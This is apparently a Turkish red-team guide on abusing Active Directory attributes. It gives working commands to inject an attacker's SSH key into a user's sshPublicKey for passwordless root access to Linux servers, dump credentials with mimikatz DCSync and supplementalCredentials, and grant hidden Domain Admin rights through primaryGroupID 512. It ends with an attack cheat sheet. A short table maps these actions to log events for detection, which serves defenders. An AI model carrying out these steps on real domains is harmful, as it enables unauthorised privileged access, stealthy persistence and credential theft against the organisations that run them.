## 1. Genel Bakış ve Mimari

Active Directory ortamları yalnızca Windows makineler için değil, kurumsal Linux sunucular (Red Hat, Ubuntu, Debian, SUSE) için de merkezi kimlik sağlayıcıdır. Linux sistemlerde kullanıcıların SSH oturum açma anahtarlarını yerel `~/.ssh/authorized_keys` dosyaları yerine merkezi AD şemasında tutmak amacıyla **OpenSSH LPK (LDAP Public Key)** şema uzantısı yaygın olarak kullanılır.

Bu mimaride, AD Şemasına `openssh-lpk` şeması dahil edilir; kullanıcı nesnelerine yardımcı sınıf olarak `ldapPublicKey` (`1.3.6.1.4.1.24552.500.1.1.2.0`) ve nitelik olarak **`sshPublicKey`** (`1.3.6.1.4.1.24552.500.1.1.1.13`) tanımlanır:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          SSH OTURUM AÇMA VE LDAP AKIŞI                      │
└─────────────────────────────────────────────────────────────────────────────┘
      [ İstemci / Saldırgan ]                  [ Linux Hedef Sunucu ]
                │                                         │
                ├─── (1) SSH Bağlantısı (id_rsa) ────────►│
                │                                         │ (2) sshd / AuthorizedKeysCommand
                │                                         ▼
                │                             [ SSSD / ldapsearch ]
                │                                         │
                │                                         ├─── (3) LDAP Sorgusu ──────────┐
                │                                         │    (&(objectClass=posixAccount│
                │                                         │      (uid=sec_admin))         │
                │                                         │                               ▼
                │                                         │                  ┌──────────────────────┐
                │                                         │                  │  DOMAIN CONTROLLER   │
                │                                         │                  │  Active Directory    │
                │                                         │                  │                      │
                │                                         │◄── (4) sshPublicKey ────────────┤
                │                                         │    (Enjekte Edilen Key)         │
                │                                         ▼                  └──────────────────────┘
                │◄── (5) Parolasız Başarılı Oturum ───────┤
                │    (Root / Sudoer Erişimi)              │
```

Saldırgan hedef kullanıcının parolasını bilmese bile, eğer hedef nesne üzerinde **`GenericWrite`**, **`GenericAll`** veya **`WriteProperty (sshPublicKey)`** yetkisine sahipse, nesnenin `sshPublicKey` alanına kendi oluşturduğu SSH açık anahtarını ekleyerek saniyeler içinde parolasız SSH oturumu elde eder.

Ayrıca bu bölümde `supplementalCredentials`, `primaryGroupID` ve `userWorkstations` gibi diğer kritik öznitelik manipülasyonları da ele alınmaktadır.

## 2. Şema Tespiti ve Hedef Yetki Analizi

### 2.1. OpenSSH LPK Şemasının Varlığını Doğrulama

Hedef AD ormanında OpenSSH LPK şemasının kurulu olup olmadığını sorgulama:

```powershell
# 1. PowerShell Active Directory modülü ile Schema sorgulama
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -Filter "name -like '*openssh*' -or ldapDisplayName -eq 'sshPublicKey'"

# 2. Linux üzerinden ldapsearch ile sorgulama
ldapsearch -x -H ldap://dc01.corp.local -b "cn=schema,cn=configuration,dc=corp,dc=local" "(cn=openssh-lpk)" cn
```

### 2.2. Hedef Kullanıcı DACL İzinlerini Tarama (PowerView & BloodHound)

Hedef Linux sunucularda `sudo` veya `root` yetkisine sahip kullanıcılar üzerinde yazma yetkimizi tespit etme:

```powershell
# PowerView ile sshPublicKey veya GenericWrite yetkilerini arama
Find-InterestingDomainAcl | Where-Object { $_.IdentityReferenceName -eq "attacker_user" -and ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty") }
```

BloodHound arayüzünde çalıştırılacak Cypher sorgusu:

```cypher
MATCH p=(u1:User)-[r:GenericWrite|GenericAll|Owns|WriteDacl]->(u2:User)
WHERE u1.name = 'ATTACKER@CORP.LOCAL'
RETURN p
```

## 3. Açık Anahtar Enjeksiyonu ve Parolasız SSH Sömürüsü

### 3.1. SSH Anahtar Çifti Üretimi

Saldırgan makinesinde özel bir test anahtarı oluşturulur:

```bash
ssh-keygen -t ed25519 -f /tmp/ad_ssh_key -N ""
export PUB_KEY=$(cat /tmp/ad_ssh_key.pub)
echo "[+] Üretilen Anahtar: $PUB_KEY"
```

### 3.2. `ldapmodify` ile `sshPublicKey` Enjeksiyonu

```bash
# 1. LDIF güncelleme dosyası hazırlama
cat << 'EOF' > /tmp/inject_ssh.ldif
dn: CN=Linux Admin,OU=Admins,DC=corp,DC=local
changetype: modify
add: objectClass
objectClass: ldapPublicKey
-
replace: sshPublicKey
sshPublicKey: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9y... attacker@kali
EOF

# 2. ldapmodify ile hedef kullanıcının nesnesini güncelleme
ldapmodify -x -H ldap://dc01.corp.local -D "corp\attacker" -w "P@ssw0rd123!" -f /tmp/inject_ssh.ldif
```

### 3.3. PowerShell ile `Set-ADUser` Üzerinden Enjeksiyon

```powershell
# PowerShell ile LDAP özniteliğini doğrudan güncelleme
$key = Get-Content -Raw C:\Temp\id_rsa.pub
Set-ADUser -Identity "linux_admin" -Add @{objectClass="ldapPublicKey"}
Set-ADUser -Identity "linux_admin" -Replace @{sshPublicKey=$key}
```

### 3.4. Hedef Linux Sunucuya Parolasız SSH Bağlantısı

Enjeksiyon tamamlandıktan sonra hedef sunucudaki SSSD/sshd servisi anahtarı doğrular ve anında oturum açılır:

```bash
# Hedef Linux sunucuya parolasız bağlanma
ssh -i /tmp/ad_ssh_key linux_admin@10.0.0.50

# Root yetkisine geçiş
sudo -i
```

## 4. Hassas LDAP Niteliklerinin İstismarı (Sensitive Attributes)

### 4.1. `supplementalCredentials` Hasadı

`supplementalCredentials` özniteliği, kullanıcının Kerberos anahtarlarını, WDigest açık metin hash'lerini ve eski parola geçmişini ikili (binary) formatta tutar. Kullanıcı nesnesini okuma yetkisi olan bir saldırgan bu alanı çözerek parola karmalarını elde edebilir:

```powershell
# 1. supplementalCredentials özniteliğini çekme
$user = Get-ADUser -Identity "krbtgt" -Properties supplementalCredentials
$user.supplementalCredentials

# 2. Mimikatz lsadump::dcsync ile hedef hesabı çekme (Aynı veriyi KDC seviyesinde dökme)
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:TargetUser" exit
```

### 4.2. `primaryGroupID` ile Gizli Domain Admin Üyeliği

Active Directory'de `Domain Admins` grubu genellikle 512 RID'sine sahiptir. Standart bir kullanıcının `primaryGroupID` değeri 513'ten (Domain Users) 512'ye çekildiğinde, kullanıcı `memberOf` listesinde `Domain Admins` olarak **görünmez**, fakat işletim sistemi seviyesinde Domain Admin token'ı alır!

```bash
# ldapmodify ile kullanıcının birincil grubunu Domain Admins yapma
cat << 'EOF' > /tmp/pgid.ldif
dn: CN=backdoor_user,OU=Users,DC=corp,DC=local
changetype: modify
replace: primaryGroupID
primaryGroupID: 512
EOF

ldapmodify -x -H ldap://dc01.corp.local -D "corp\attacker" -w "P@ss123" -f /tmp/pgid.ldif
```

### 4.3. `userWorkstations` Kısıtlamasını Silme

Bazı kritik hesaplar `userWorkstations` özniteliği ile yalnızca belirli IP/bilgisayarlardan oturum açmaya zorlanır. Bu nesneye yazma yetkisi olan saldırgan kısıtlamayı kaldırarak her yerden yanal hareket edebilir:

```powershell
Set-ADUser -Identity "db_admin" -Clear userWorkstations
```

## 5. OPSEC ve Olay Günlüğü Analizi (Blue Eşleştirmesi)

| Eylem | Olay Günlüğü / Telemetri | Tespit Kriteri |
|---|---|---|
| LDAP Nesne Nitelik Değişikliği | **Windows Security Event ID 5136:** A directory service object was modified. | `AttributeLDAPDisplayName`: `sshPublicKey` veya `primaryGroupID` |
| Şema Değişikliği | **Event ID 5137:** A directory service object was created (Schema container). | Şemaya yeni sınıf/öznitelik ekleme |
| Linux SSH Oturum Açma | **Linux `/var/log/auth.log`:** `Accepted publickey for ... from IP ssh2` | Bilinmeyen bir SSH key fingerprint ile başarılı giriş |

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Hedef kullanıcının sshPublicKey alanını ldapsearch ile sorgulama
ldapsearch -x -H ldap://10.0.0.10 -b "dc=corp,dc=local" "(sAMAccountName=target_user)" sshPublicKey

# 2. Yeni SSH anahtarı oluşturma
ssh-keygen -t rsa -b 4096 -f /tmp/attack_key -N ""

# 3. ldapmodify ile kullanıcıya sshPublicKey yazma
ldapmodify -x -H ldap://10.0.0.10 -D "user@corp.local" -W -f update_key.ldif

# 4. Parolasız SSH bağlantısı test etme
ssh -i /tmp/attack_key target_user@linux01.corp.local

# 5. PowerShell ile kullanıcının primaryGroupID değerini 512 yapma
Set-ADUser -Identity "backdoor_user" -Replace @{primaryGroupID=512}

# 6. PowerShell ile supplementalCredentials okuma
Get-ADUser -Identity "target_user" -Properties supplementalCredentials | Select-Object -ExpandProperty supplementalCredentials
```
